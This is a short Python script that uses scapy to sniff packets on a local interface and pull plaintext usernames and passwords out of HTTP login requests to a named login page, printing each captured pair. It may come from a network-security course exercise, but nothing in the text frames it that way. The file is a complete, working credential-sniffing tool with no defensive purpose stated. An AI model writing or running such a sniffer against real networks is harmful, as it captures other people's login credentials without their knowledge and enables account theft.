#!/usr/bin/env python

import scapy.all as scapy
from urllib import unquote
import time,sys,re

def proc_of_pkt(packet):
	ip_layer = packet.getlayer(scapy.IP)
	if ip_layer:
		print("[+] New Packet: {src} -> {dst}".format(src = ip_layer.src, dst = ip_layer.dst))
	data = str(packet)
	pattern = re.compile(r'usr=.*&pwd=.*&btn_login=Login')
	# target: "usr=USERNAME&pwd=PASSWORD&btn_login=Login"
	result = re.findall(pattern,data)
	if result:
		for res in result:
			username = res.split('&')[0][4:]
			password = res.split('&')[1][4:]
		print('[+] USERNAME: ' + unquote(username) + '\tPASSWORD: ' + unquote(password))


def main():
	print("[*] Packet Sniffing...")
	print("[*] Filtering possible Login info from http://140.113.207.246/login.php\n")
	scapy.sniff(iface = 'enp0s3',store = False,prn = proc_of_pkt)
	print("\n[!] Stop packet sniffing.")

if __name__ == '__main__':
	main()